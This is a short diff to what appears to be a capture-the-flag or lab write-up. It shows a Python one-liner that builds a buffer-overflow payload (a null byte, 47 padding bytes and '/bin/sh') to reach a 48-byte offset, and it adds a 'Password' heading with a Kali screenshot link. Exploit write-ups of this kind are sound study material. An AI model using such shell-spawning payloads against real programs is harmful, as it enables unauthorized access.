@@ -90,4 +90,7 @@ Our payload looks like this now. For the offset, we need 48 bytes (zero + 47 byt
 ```
 python3 -c "import sys; sys.stdout.buffer.write(b'\x00' + b'A' * 47 + b'/bin/sh\x00')"
 ```
+# Password
+
+<img width="1341" height="145" alt="VirtualBox_Kali_07_04_2026_23_01_53" src="https://github.com/user-attachments/assets/57166629-abbe-4179-865f-127c19973acb" />
 
